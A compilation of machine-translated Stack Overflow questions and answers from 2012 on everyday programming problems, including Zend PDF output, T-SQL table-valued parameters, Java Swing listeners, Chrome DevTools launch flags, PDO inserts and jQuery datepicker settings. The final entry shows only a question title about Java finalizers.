# php - 同时创建多个 PDF

> ID：12461904
> 
> 赞同：1
> 
> 时间：2012-09-17T14:54:18.327
> 
> 标签：php, zend-framework, pdf, pdf-generation

我想同时创建多个 PDF。但每个文档总是覆盖。第一个没问题，但之后第二个和第三个文本被覆盖。

```
<?php

    try {
        $pdf = new My_Pdf();

        $page = new Zend_Pdf_Page(Zend_Pdf_Page::SIZE_A4);
        $font = Zend_Pdf_Font::fontWithName(Zend_Pdf_Font::FONT_TIMES);
        $page->setFont($font, 11);
        $data = Model_DefendantsBanksMapper::getInstance()->getForPDF($values[0]['id']);

        foreach ($data as $k => $defendant) {
                           $pdf->drawText($page, $defendant, 85, 660);

            $pdf->pages[] = $page;
            $pdf->save('pdf/Bank_Supoena_' . $values[0]['id'] . '_' . $k . '.pdf');
        }

    } catch (Zend_Pdf_Exception $e) {
        die('PDF error: ' . $e->getMessage());
    } catch (Exception $e) {
        die('Application error: ' . $e->getMessage());
    }

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T05:45:08.577

解决它。谢谢。pdf的创建应该在foreach中

# language-agnostic - 富文本编辑器的字符串长度限制

> ID：12461905
> 
> 赞同：2
> 
> 时间：2012-09-17T14:54:22.003
> 
> 标签：language-agnostic, rich-text-editor

我正在开发的 Web 应用程序中广泛使用富文本编辑器 (tiny_mce)。我似乎无法理解的一个问题是如何限制用户输入，以便生成的内容的长度适合我的数据库字段。我通常用于非富文本内容的字符计数器非常无用，因为用户看不到（或知道或关心）在幕后生成的 HTML。即，如果我将输入限制为 100 个字符并且用户键入 99 个字符，由于用于在幕后构建其内容的 html 标签，他们仍然可能超过字符限制。

我看到的选项是：

*   什么都不做，希望最好。显然不是一个真正的选择。尝试保存到数据库（在这种情况下为 mysql）时，插入很有可能会不正常地失败。
*   验证生成的 HTML 的长度，如果超过允许的长度，则向用户提供消息。这将使尽其所知已满足文本输入要求的用户感到困惑。告诉他他已经超过了限制，而实际上他只输入了 99 个字符，只会让人感到困惑/激怒
*   让数据库字段超大，*希望*永远不会被超过。好像是个坏主意...

这应该是一个经常遇到的问题。这里最好的解决方案是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-05T17:32:50.660

当表单提交时，对提交的字段的长度进行 Javascript 检查。

至于你的选择：

**问：** 什么都不做，希望最好。

**答：**行不通。有些人会尝试一些东西

**问：** 验证生成的 HTML 的长度，如果超过允许的长度，则向用户提供消息。

**A：**我最近也遇到过类似的情况。我在页面上放了一条静态消息，说限制是 10,000，但我实际上检查了 50,000。这工作了几个月，直到有人从 MS Word 中复制和粘贴。用户看到了 5,000 个字符，但它的编码方式超过了 100,000

**Q：** 数据库字段超大，希望永远不会被超过。好像是个坏主意...

**答：**根据您的数据库和版本，这可能是可以容忍的，不是很理想，但可以容忍。

# reporting-services - 同一 SSRS 图表中的两种图表类型（条形和线形）

> ID：12461908
> 
> 赞同：19
> 
> 时间：2012-09-17T14:54:30.967
> 
> 标签：reporting-services, charts, reportingservices-2005, bar-chart, linechart

**SSRS 2005 如何在同一张图表上表示两种图表类型（即条形和折线）？**

我正在尝试创建一个看起来像下面专业制作的图像的图表：

![很棒的图表演示](../Images/30ae3db12b118cbb18559b42315fcb82.png)

该图表将有一个系列表示为条形图，然后将另外两个系列表示为重叠折线图。

我将折线图作为两个独立的系列工作，我可以编写我的 SQL 查询来返回条形图系列月份的空值和两个线系列上年份的空值，以防止重叠，但我没有看到如何指定每个系列的图表类型。

实际上，这可以使用 SSRS 完成吗？还是视觉模拟？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-10-19T10:25:44.793

选择图表，确保它突出显示并且图表数据框出现在图表的右侧，您的两个系列都应该列在“值”部分中。单击“系列”值右侧的下拉箭头，使用此处的“更改图表类型”选项（每个系列）。这只会影响您单击下拉列表的系列:)

# sharepoint - Sharepoint 2010 计时器作业自定义属性

> ID：12461909
> 
> 赞同：1
> 
> 时间：2012-09-17T14:54:31.113
> 
> 标签：sharepoint, sharepoint-2010, custom-properties, sharepoint-timer-job

我正在将 WSS3 计时器作业转换为 SP 2010，并且遇到自定义属性问题。在 WSS3 中，我必须下载一个部署在 Sharepoint Administration 中的 Timer Job Manager，它允许我管理作业运行的日期和时间，以及我在项目代码中定义的自定义属性：

```
 <Persisted()> _
Public SiteURL As String 
```

这就是我所要做的，一旦我部署了我的计时器作业，自定义属性就会出现在 sharepoint 管理的计时器作业管理器中，然后我可以在其中设置它。

在 SP2010 中，他们似乎已经完成了 Timer Jobs 的一半。他们允许设置作业何时运行，这与我为 WSS3 下载的自定义项目完全相同，但似乎没有任何自定义属性可供设置。

我的问题是我做错了什么？还是他们只是没有将此功能合并到 SP2010 中？

提前感谢您的任何答案，我希望我已经清楚地解释了自己。

# tsql - TVP - 它们用于输入和输出吗？

> ID：12461913
> 
> 赞同：1
> 
> 时间：2012-09-17T14:54:38.680
> 
> 标签：tsql, sql-server-2008-r2

我已经开始阅读关于表值参数的注释

*   [在 MSDN 上](http://msdn.microsoft.com/en-us/library/bb510489.aspx)

*   [在索马尔斯科格这里](http://www.sommarskog.se/arrays-in-sql-2008.html#TVP_in_TSQL)

这些TVP可以作为输入参数和输出参数吗？
将它们作为输出参数有什么意义吗？
我觉得可能有一个 TVP 作为一个存储过程的输出，然后再输入另一个存储过程 - 可能吗？
调用第一个存储过程然后使用第一个存储过程的输出 TVP 调用第二个存储过程的脚本的语法是我不确定的一点。

**编辑**

为我的帖子的混乱道歉-似乎初始程序结果需要进入 TVP-我认为 TVP 需要参与*到*该存储过程中。所以我所说的一个模型如下 - 希望是 TVP 的有效使用......

```
CREATE TYPE myfirstTVP AS TABLE (id INT NOT NULL PRIMARY KEY);

GO --<<this sproc will find the ids (+ other fields) that need to be investigated
    CREATE PROC test1 as
        SELECT 1 UNION 
        SELECT 2 UNION
        SELECT 3;
GO

GO --<<this sproc uses the found ids to do one aspect of the investigation
    CREATE PROC test2 
    @t2 myfirstTVP READONLY 
    AS
            SELECT id*2 
            FROM @t2;
GO

GO --<<this sproc uses the found ids to do another aspect of the investigation
    CREATE PROC test3 
    @t4 myfirstTVP READONLY 
    AS
            SELECT id*3 
            FROM @t4;
GO    

    --<<this is where the TVP is used and the sprocs are called 
    DECLARE @t3 myfirstTVP ;
    INSERT INTO @t3 
    EXEC test1;

    EXEC test2 @t3;
    EXEC test3 @t3; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:06:59.400

我不是 100% 确定你想要实现什么，但你可以在某种意义上模拟“输出”参数的行为，

```
CREATE TYPE LIST_OF_INT AS TABLE (id int not null primary key);
GO
create procedure test1 as
begin
  declare @t1 LIST_OF_INT;
  insert into @t1 (id) values (1);
  select * from @t1;
end;

GO

declare @t2 LIST_OF_INT ;
insert into @t2 
EXEC test1;

select * from @t2; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:58:54.450

我认为您从引用的 MSDN 链接中错过了这一点。

> 表值参数必须作为输入 READONLY 参数传递给 Transact-SQL 例程。

# java - 相邻类中的 ActionListener 实现

> ID：12461915
> 
> 赞同：0
> 
> 时间：2012-09-17T14:54:45.170
> 
> 标签：java, swing, class, listener, actionlistener

我认为在同一个类中编写侦听器不是 OOP 方式。所以，我尝试在另一个文件中编写监听器。

有效的代码是：

```
class MyPanel extends JPanel{
 private String tString = "Test String";
 private JLabel tLabel;
 public MyPanel(){
    tLabel = new JLabel("Label");
    JButton tButton = new JButton("Click me");

    tButton.addActionListener(new ActionListener(){   
    public void ActionPerformed(ActionEvent e){
     tLabel.setText(tString);
    }
   });
} 
```

但是当我在单独的文件中写监听器时：

```
public class MyListener implements ActionListener{
 copy code here
} 
```

和改变

```
tButton.addActionListener(new ActionListener(){ 
```

到

```
tButton.addActionListener(new MyListener()); 
```

它不起作用。当然，我尝试过不同的组合。

例如，将“this”发送到侦听器的构造函数，并从侦听器类中接收到的对象调用方法。

错误：

```
MyListener: cannot find symbol "tLabel" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:00:57.100

你的`MyListener`类必须有一个构造函数。`MyListener`您在类构造函数中传递“this”和您需要的任何其他参数。

这是我的一个项目的一个例子。

```
package com.ggl.project.planner.controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import com.ggl.project.planner.model.Planner;
import com.ggl.project.planner.model.Project;
import com.ggl.project.planner.view.CreateUpdateProjectDialog;
import com.ggl.project.planner.view.ProjectPlannerFrame;

public class CreateProjectActionListener implements ActionListener {

    protected Planner planner;

    protected Project project;

    protected ProjectPlannerFrame frame;

    public CreateProjectActionListener(ProjectPlannerFrame frame,
            Planner planner, Project project) {
        this.frame = frame;
        this.planner = planner;
        this.project = project;
    }

    @Override
    public void actionPerformed(ActionEvent event) {
        CreateUpdateProjectDialog dialog = 
                new CreateUpdateProjectDialog(frame, project, true);
        if (dialog.isOkPressed()) {
            planner.setProjectOpen(true);
        }
    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:06:33.690

您的`MyListener`类没有对`tLabel`变量的引用。

您可以通过构造函数设置它，也可以将`MyPanel`引用传递给`MyListener`and 有一个方法可以在 and`MyPanel`上执行所需的操作，`JLabel`并且可以从`MyListener`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T15:14:33.213

感谢您编辑您的答案:)

您似乎正在尝试`tLabel`从新侦听器访问该变量，但它可能已声明为不可访问`private`。同样的事情也可能发生在`tString`. 试试这个：

```
public class MyListener implements ActionListener{

    private MyPanel myPanel;

    public MyListener(MyPanel myPanel) {
        this.myPanel = myPanel;
    }

    public void ActionPerformed(ActionEvent e) {
        myPanel.getTLabel().setText(myPanel.getTString());
    }
} 
```

并为每个和添加一个`tString`吸气`tLabel`剂`MyPanel`：

```
public class MyPanel extends JPanel {

    // ...

    public String getTString() {
        return tString;
    }

    public JLabel getTLabel() {
        return tLabel;
    }
} 
```

当您无法访问私有字段时，通常会添加一个`public`“getter”来返回该字段，而不是更改字段本身的访问权限。约定是，例如，如果字段是 a`String`并且是 named `myField`，则 getter 是 named `getMyField`。像这样，您还可以添加设置器来设置该变量。有关 getter 和 setter 的更多信息，请参阅[此问题](https://stackoverflow.com/questions/1568091/why-use-getters-and-setters)。

# sharepoint - sharepoint 的移动层是什么？

> ID：12461918
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:54:49.240
> 
> 标签：sharepoint, mobile, sdk

根据 MSDN 文档，“目前，SharePoint 2013 Preview 中的 REST 服务是只读的。”，因此我需要识别对共享点数据库及其工作流程的双向、r/w 访问。

MSDN 文档参考：[MSDN 在 Sharepoint 2012 中构建移动应用程序](http://msdn.microsoft.com/en-us/library/jj163228%28v=office.15%29.aspx)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T17:23:16.277

嗯……这里尽力了。您指的是 MSDN 文档的哪一部分。SharePoint 2013 中有常规的 REST Web 服务，您几乎可以访问 SharePoint 的所有内容。不过，目前 SharePoint 处于测试阶段，文档也是如此。尝试查找 SharePoint 2013、REST，`_api`您将找到您需要知道的一切。

# google-apps-script - 如何上传动态创建的 Google Apps 脚本？

> ID：12461922
> 
> 赞同：2
> 
> 时间：2012-09-17T14:55:02.367
> 
> 标签：google-apps-script

我想动态创建一个脚本，然后将其作为 Google Apps 脚本上传。当我尝试这个时，要么

1.  如果我正确设置了 mime 类型，链接看起来不错，但不起作用（找不到文件）。

2.  如果我创建一个文本文件，那就是它的本来面目——文本文件，而不是脚本文件。

我是否需要将我的代码包装在一个额外的层中，以便编辑器可以使用它？

谢谢

迈克尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-21T13:59:03.647

有一种方法我见过人们实现这样的东西，但这样做会自担风险：UrlFetchApp 和 eval()。您最终不得不将脚本托管在其他地方，将其拉回，然后在某个地方的脚本上点击 eval()。您可以通过 Google Drive 同步和 DocList API 来做到这一点。

Apps Script 中的 Apps Script API 是我们听到反馈并正在谈论的东西，FWIW，但不要让这阻止您在此期间完成您需要完成的事情。

# database - 如何在windows应用程序中存储数据

> ID：12461939
> 
> 赞同：0
> 
> 时间：2012-09-17T14:55:52.480
> 
> 标签：database, windows

我在我的应用程序中使用过数据库，但到目前为止我只创建了私人使用的应用程序。每次在我的应用程序中使用访问数据库时，我都必须在最终用户计算机上安装 JET 引擎的驱动程序。我想更多地了解如何在最终用户计算机上存储数据，而无需他们安装任何东西，而不仅仅是应用程序。如果数据管理技术轻巧快速，那就太好了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:59:12.610

如果您需要一个客户端 SQL 数据库，那么您可以查看[SQLite](http://sqlite.org/)。数据库只是单个文件，您只需附带一个小型库，就可以省去安装其他人也没有真正使用过的系统范围组件的所有麻烦。

当然，“数据”的含义非常广泛，因此这完全取决于您需要什么以及用于什么目的。但是要替换一个 JET 数据库 SQLite 应该是很合适的。

# ms-access - 就 Microsoft Access 报告而言，A4 页面的尺寸是多少？

> ID：12461947
> 
> 赞同：2
> 
> 时间：2012-09-17T14:56:30.777
> 
> 标签：ms-access

我正在尝试创建一个与一个 A4 页面大小完全相同的 Microsoft Access 报告。

根据[paperizes.org](http://www.papersizes.org/a-paper-sizes.htm)，A4 页面的确切尺寸是`29.7cm x 21cm`.

所以我使用`Report Design`按钮创建了一个新的 MS Access 报告。我已关闭页眉和页脚，并将我的`Height`属性设置为. 设置为**No**，设置为**Yes**。`29.7cm``Width``21cm``Auto Resize`**`Fit to Page`**

 ****每当我打印预览报告时，都会跨越四张 A4 页面。

这就是我尝试过的，我的问题是在 Microsoft Access 中，我需要使用哪些尺寸来创建与单个 A4 页面大小相同的报告？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T15:19:19.490

设置报表的高度和宽度属性将不起作用。您必须在页面设置屏幕中设置纸张尺寸，这也允许您设置边距。****

# ios - popOver 不跟随滑块 -iOS/Xcode

> ID：12461950
> 
> 赞同：0
> 
> 时间：2012-09-17T14:56:34.833
> 
> 标签：ios, xcode, slider, popover

我设法插入了一个弹出框，但我无法使弹出框跟随 UISlider .. 它只显示在滑块的右下角.. 我做错了什么？我该如何解决？先感谢您..

```
percentView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 41, 33)];

UIImageView *percentImageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 41, 33)];
[percentImageView setImage:[UIImage imageNamed:@"ipad-progress-value.png"]];
[percentView addSubview:percentImageView];

UILabel *percentLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, 41, 26)];
[percentLabel setTag:1];
[percentLabel setText:@"m"];
[percentLabel setBackgroundColor:[UIColor clearColor]];
[percentLabel setTextColor:[UIColor whiteColor]];
[percentLabel setFont:[UIFont boldSystemFontOfSize:13]];
[percentLabel setTextAlignment:UITextAlignmentCenter];
[percentLabel setAdjustsFontSizeToFitWidth:YES];
[percentView addSubview:percentLabel];

[_slider addSubview:percentView]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:02:54.520

文档中没有任何内容表明弹出框将跟随滑块。将弹出框放在您指定的控件旁边只是一种方便，因为通常用户触摸按钮会启动弹出框。

一般来说，弹出框不会“跟随”任何东西或移动。

如果您知道滑块控件的位置，您可以使用以下

```
- (void)presentPopoverFromRect:(CGRect)rect inView:(UIView *)view permittedArrowDirections:(UIPopoverArrowDirection)arrowDirections animated:(BOOL)animated 
```

提供滑块的矩形。

如果您想在显示弹出框时移动它，我认为您会遇到问题，但是您可以查看 UIView 动画代码并尝试通过继承 UIPopover 来自己绘制它。

# c++ - G++ 编译，但没有任何反应

> ID：12461952
> 
> 赞同：1
> 
> 时间：2012-09-17T14:56:38.577
> 
> 标签：c++, compiler-construction, g++

我目前正在运行`g++`版本`4.3.4`，当我运行以下命令时：

> g++ -g -Wall test.cpp -o test.exe

对此：

```
#include<stdlib.h>
#include<iostream>

using namespace std;

int main (){
   cout << "Hello World!";
   system("pause");
   return 0;
} 
```

似乎什么都没有发生：`Cygwin`似乎滞后了一会儿，但没有`exe`创建（如果源中有错误`cpp`，则显示）

和想法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:59:40.763

我怀疑您实际上是在调用内置`test`命令。你是在执行你的程序`./test`吗`./test.exe`？这应该可以，但我会重命名它，以防万一。

# ms-access - 我必须在 Access2007 中的 Combobox 上单击两次

> ID：12461954
> 
> 赞同：1
> 
> 时间：2012-09-17T14:56:38.563
> 
> 标签：ms-access, combobox, click

我有一个只有一个文本列的表格。此外，我有一个带有组合框的表单。现在我希望组合框重新查询焦点。所以我在vba中添加了一个方法：

```
Private Sub combobox1_GotFocus()
    With combobox1
        .RowSource = "SELECT text " + _
           "FROM tblExample " + _
           " ORDER BY text"

        .Requery
    End With

End Sub 
```

当我现在单击组合框1 时，下拉列表不会打开。只有当我第二次点击它时，它才会打开。这里有什么问题？如果我将这两条 .-line 放在评论中，我可以只单击一次组合框并显示一个空列表。

注意：我简化了问题。我有另一个公式，我在其中做同样的事情并且效果很好。我希望有人知道如何解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T12:50:50.670

当您重新查询组合框时，它会暂时失去焦点。当您再次单击它时，它已经具有焦点，因此`OnFocus`不会触发该事件。您可能希望在用户单击组合框之前重新查询它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-09-11T06:22:52.200

您的 OnFocus 操作很好，但您也可以添加类似这样的操作。

```
Private Sub combobox1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
  Me.combobox1.SetFocus
  Me.combobox1.Dropdown
End Sub 
```

# google-chrome - 使用 target='_blank' 链接自动打开 Chrome 开发工具？

> ID：12461966
> 
> 赞同：6
> 
> 时间：2012-09-17T14:57:25.283
> 
> 标签：google-chrome, google-chrome-devtools

当您点击一个`target='_blank'`链接时，它自然会在 Google Chrome 中打开一个新标签页。对于特定站点，我需要使用 Chrome 开发人员工具来检查打开的任何新选项卡的 http 请求。

每当您在当前页面上打开 Chrome 开发工具，然后单击打开新选项卡的链接时，默认情况下不会在新页面上打开 Chrome 开发工具。此时打开 Chrome 开发工具为时已晚，因为这些工具不会捕获页面的 http 请求。

此外，在许多情况下，这些新标签在到达最终页面之前会经过一系列重定向，因此我无法在打开 Chrome 开发工具后简单地重新加载页面。

我能想到的唯一解决方法是，如果我正在处理的站点位于本地开发服务器上，我可以暂时将链接从 更改`target='_blank'`为`target='_self'`，但这对于具有数千个链接的站点或我无法控制代码的网站。

Is it possible to set Chrome Dev Tools to automatically open with every new tab (opened either manually or via `target='_blank'`?

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2020-06-16T00:41:03.057

我不确定这更改了哪个 Chrome 版本，但如果您单击开发工具上的设置轮：

[![在此处输入图像描述](../Images/589326aff43f6cd04d309db53315252a.png)](https://i.stack.imgur.com/Rwus5.png)

您将看到一个带有“Auto-Open DevTools for popups”复选标记的 Global 部分，该部分适用于`target="_blank"`使用 devtools 窗口打开链接：

[![在此处输入图像描述](../Images/e180a198417b0598d110b5af00565833.png)](https://i.stack.imgur.com/f2Nbk.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-06-23T13:08:14.153

可以为所有新选项卡自动打开 devtools，而不仅仅是 target = _blank。启动 google chrome 时，传递 flag `--auto-open-devtools-for-tabs`。它可以为自动创建的所有窗口启动开发工具。

对于 Linux

> google-chrome --auto-open-devtools-for-tabs

对于 Mac

> open -a "Google Chrome" --args --auto-open-devtools-for-tabs

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-18T06:40:55.010

您只能通过 UI 操作或键盘快捷键打开 DevTools 窗口。无法自动执行此操作。

# php - PDO 两个相似的查询 - 只有第一个插入

> ID：12461968
> 
> 赞同：0
> 
> 时间：2012-09-17T14:57:30.280
> 
> 标签：php, mysql, pdo

我有一个表单，用户可以在其中插入最多五个行项目的发票。对我来说，最简单的方法是只进行五次插入并`isset`在每次查询之前进行检查。但是，问题是如果我尝试一个接一个地运行这两个查询，那么只有第一个会插入数据。我知道我可以将它们组合成一个 PDO 查询（这确实有效），但它不适合我的需要。**第二个查询不插入。**

```
// Connect to the database
$conn = new PDO("mysql:host=$DB_HOST;dbname=$DB_DATABASE",$DB_USER,$DB_PASSWORD);

//Set all the data here 
$receiptid = $_POST['receiptid'];
    // .. the rest of the POST data gets set here.

//Insert first line item
$sql = "INSERT INTO lineitems (receiptid, service, description, quantity, unitprice, linetotal) 
        VALUES (:receiptid, :service, :description, :quantity, :unitprice, :linetotal)";
$q = $conn->prepare($sql);
$q->execute(array(':receiptid'=>$receiptid,
                    ':service'=>$service,
                    ':description'=>$description,
                    ':quantity'=>$quantity,
                    ':unitprice'=>$unitprice,
                    ':linetotal'=>$linetotal));

//Insert second line item
$sql = "INSERT INTO lineitems (receiptid, service2, description2, quantity2, unitprice2, linetotal2) 
        VALUES (:receiptid, :service2, :description2, :quantity2, :unitprice2, :linetotal2)";
$q = $conn->prepare($sql);
$q->execute(array(':receiptid'=>$receiptid,
                    ':service2'=>$service2,
                    ':description2'=>$description2,
                    ':quantity2'=>$quantity2,
                    ':unitprice2'=>$unitprice2,
                    ':linetotal2'=>$linetotal2)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:02:16.733

对于每个输入的项目编号（即 service2、descriptions2 等），您的表是否真的有不同的列？

也许您需要更改第二次插入中的字段名称以匹配第一次中的字段名称。

If you were handling cases where you did not get expected query result properly (i.e. checking your execution results and looking at the errors if something fails, You would be able to get to the source of the problem in a hurry.)

# haskell - Haskell分析中的星号含义？

> ID：12461972
> 
> 赞同：4
> 
> 时间：2012-09-17T14:57:38.333
> 
> 标签：haskell, profiling

在进行堆驻留配置文件 (-hy) 时，在类型中显示的 askterisk 含义是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-28T11:00:42.413

当您在堆配置文件中看到星号时，请尝试执行 -hd 配置文件，它实际上会给您一个描述，例如，如果有问题的对象是您的堆栈上的闭包等。

# amazon-web-services - AWS 和尼尔森定律

> ID：12461976
> 
> 赞同：1
> 
> 时间：2012-09-17T14:57:54.847
> 
> 标签：amazon-web-services, cloud

这不完全是一个编程问题，但它与程序员有关，我正在寻找一个有数据支持的具体答案。

我在一个领域工作，我们创建的文件的大小大约每 100 天翻一番。尼尔森定律表明，连接速度每年增加约 50%，这意味着每 600 天翻一番。有一些关于在 AWS 或其他云计算服务上进行处理的讨论。

对我来说，这似乎难以置信，因为上传数据所需的时间很快就会使处理时间相形见绌。但是，尼尔森定律（Nielsen 的[原创文章](http://www.useit.com/alertbox/980405.html)）是针对最终用户的连接速度制定的，所以我不确定我是否能说明这一点。

有谁知道 AWS 连接速度或机构（例如大学或公司，而不是住宅）连接速度的公共资源，随着时间的推移？我想知道它是否仅比住宅大，但仍以相同的速度增长，或者由于某种原因，与机构客户的连接速度可能比尼尔森定律更快。感谢您在寻找有关随着时间推移的趋势证据方面的任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T13:10:44.383

我不能代表尼尔森定律，但是您关于 AWS 的问题几乎是不可能回答的（实际上，“我们应该如何花这笔钱”条款）。

AWS 的连接速度取决于您的身份、您必须花费的金额以及您所在的位置。例如，您可以在弗吉尼亚州雷斯顿托管一个机架吗？亚马逊使用的另一个数据中心提供商怎么样？每个 AZ 有三个。如果可以的话，您可能会在您的机架和他们的机架之间协商比正常情况下更多的带宽。您是 Foursquare 大小的客户吗？您是否计划在 20,000 个实例上运行您的作业？我相信亚马逊网络工程会帮助你尽可能地利用每一滴带宽，并且可能还会写一篇关于它的白皮书。有传言称，在 eu-west 和 us-east 之间有专用的非公共 Internet 管道。今天的云网络图可能与 2017 年的完全不同。

这并不是说您的问题是错误的或不好的，只是很难回答。作为一个思想实验，它很吸引人。作为关于长期容量规划和资本支出的讨论中的一个论点，我不确定它是否有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T15:06:39.527

我认为只是想出一个漂亮的图表来绘制未来的估计数据下载时间应该能说明你的观点。

# javascript - 防止选择过去的日期

> ID：12461977
> 
> 赞同：2
> 
> 时间：2012-09-17T14:58:07.010
> 
> 标签：javascript, jquery, datepicker

我们如何防止日期选择器选择过去的日期？

我使用了以下内容：

```
 $("#Date").datepicker({ minDate: '0' });
 $("#Date").datepicker({ minDate: new Date() }); 
```

但我仍然可以选择过去的日期。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:59:41.517

显然这是这样

```
$("#datepicker").datepicker({ minDate: 0 }); 
```

从 0 中删除引号

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-09-17T14:59:32.223

您是否尝试过使用[mindate 和 maxdate 参数](http://jqueryui.com/demos/datepicker/#min-max)？

JSFiddle[在这里](http://jsfiddle.net/5arx/s6WQJ/1/)。

查看[文档](http://jqueryui.com/demos/datepicker/#option-minDate)并尝试一下。

# php - 日志分析器中的 PHP 脚本超时

> ID：12461978
> 
> 赞同：1
> 
> 时间：2012-09-17T14:58:13.817
> 
> 标签：php, mysql, linux, logging

我一直试图让 Log Analyzer 工作的时间比我愿意承认的要长。我似乎无法在 Log Analyzer web-GUI 中显示 syslog 消息，但今天早上我收到以下错误：

“在读取日志流时，php脚本超时迫使我在这一点上中止。如果你想避免这种情况，请在你的config.php中增加LogAnalyzer脚本超时。如果安装了用户系统，你可以在Admin中这样做中心。”

星期五我没有收到这个错误；只有“未找到系统日志记录”。配置文件中的超时设置为 30 秒，但我读到该设置无论如何都会被覆盖回默认值。该数据库在周末增长到超过 4GB。数据库大小与此有关吗？

很明显我是 php 和 Log Analyzer 的新手，因此我们将不胜感激。如果需要，我可以发布配置文件设置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:21:55.983

尝试增加时间。30 秒可能不足以解析大文件。例如设置 600 秒。

增加超时的另一种情况 - 编辑 php.ini 文件中的以下行

```
; Duration of time, in seconds for which to cache realpath information for a given
; Maximum execution time of each script, in seconds
; http://php.net/max-execution-time
max_execution_time = 30; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-02-14T12:08:14.937

数据库中的记录太多，脚本没有足够的时间处理所有内容。我将过去 14 天的数据保存在数据库中，这就足够了。

```
USE Syslog;
DELETE FROM Syslog.SystemEvents WHERE ReceivedAt < DATE_SUB(NOW(), INTERVAL 14 DAY); 
```

# sql-server-2008 - SQL 返回包含无数据的字段列表

> ID：12461990
> 
> 赞同：1
> 
> 时间：2012-09-17T14:59:00.327
> 
> 标签：sql-server-2008

> **可能重复：**
> [SQL：仅选择具有 NULL 值的列](https://stackoverflow.com/questions/63291/sql-select-columns-with-null-values-only)
> [查找未使用的字段（全部为空）](https://stackoverflow.com/questions/11403665/find-fields-that-arent-used-have-all-nulls)

我有一个包含 400 个字段和 3 Bil 行的表，其中 100 个没有值/数据。有人可以给我一个示例或建议，说明如何继续获取该表中所有 3 Bil 行的 100 列的列表。先感谢您。

# ios - IOS：NSUserDefaults 在设备上找不到设置

> ID：12461993
> 
> 赞同：0
> 
> 时间：2012-09-17T14:59:13.000
> 
> 标签：ios, nsuserdefaults

我将应用程序内的一些应用程序设置表单移至“设置”菜单

在模拟器上一切正常（像往常一样：D），但是当我尝试部署到设备时，它在我的 NSUserDefaults 中找不到设置值。

在“设置”菜单中，我可以看到我的应用程序及其设置，但是当我运行此代码时：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    [defaults synchronize];   
    NSString *loc=[defaults objectForKey:@"currency"];
    NSLog(@"start");
    NSLog(@"--- %@",loc);
    [defaults setObject:loc forKey:@"localisation"]; 
```

我得到：

> 2012-09-17 15:51:08.240 MyApp[259:707] 开始
> 
> 2012-09-17 15:51:08.243 MyApp [259:707] ---（空）

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-05T17:00:55.993

`NSUserDefaults`有方法`registerDefaults:`。

# c# - Fluent NHibernate.Automapping 更改数据库中的数据类型

> ID：12461994
> 
> 赞同：1
> 
> 时间：2012-09-17T14:59:18.877
> 
> 标签：c#, fluent-nhibernate, automapping

我是 FluentNHibernate 的新手。我正在使用自动映射。假设我有一个由 NHibernate 生成的数据库。有一个名为 Document 的表，有 2 列

*   编号：整数
*   说明：nvarchar(255)

映射到这个类

```
public class Document
{
    public virtual int Id { get; set; }
    public virtual string Description{ get; set; }
} 
```

我想将描述的数据类型从 nvarchar(255) 更改为数据库中的文本，所以我创建了一个控制台应用程序，如下所示：

```
public class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine("Start process");           

        AutoMap.AssemblyOf<Document>().Override<Document>(y => y.Map(x => x.Description).CustomSqlType("text"));         

        Console.WriteLine("End process");
    }
} 
```

没有错误，但什么也没发生，Description 列仍然是 nvarchar(255)。我不知道我在这里错过了什么。任何想法表示赞赏！谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T13:12:59.083

SchemaUpdate 不能更改列，只能添加它。但是，您可以重新创建（删除并创建）它。此外，如果您将文本字段的长度设置为超过特定阈值（通常为 8k），那么大多数驱动程序将创建等效的“text”而不是“varchar”。

```
var config = Fluently.Configure()
    .Database(...)
    .Mappings(m => m.Automapping.Add(AutoMap.AssemblyOf<Document>().Override<Document>(y => y.Map(x => x.Description).Length(20000)))
    .BuildConfiguration();

new SchemaExport(config).Create(true, true); 
```

# java - 如何正确实现终结器以检测 Java 中的资源泄漏

> ID：12461995
> 
> 赞同：7
> 
> 时间：2012-09-17T14:59:24.513
> 
> 标签：java, resources, garbage-collection, finalizer

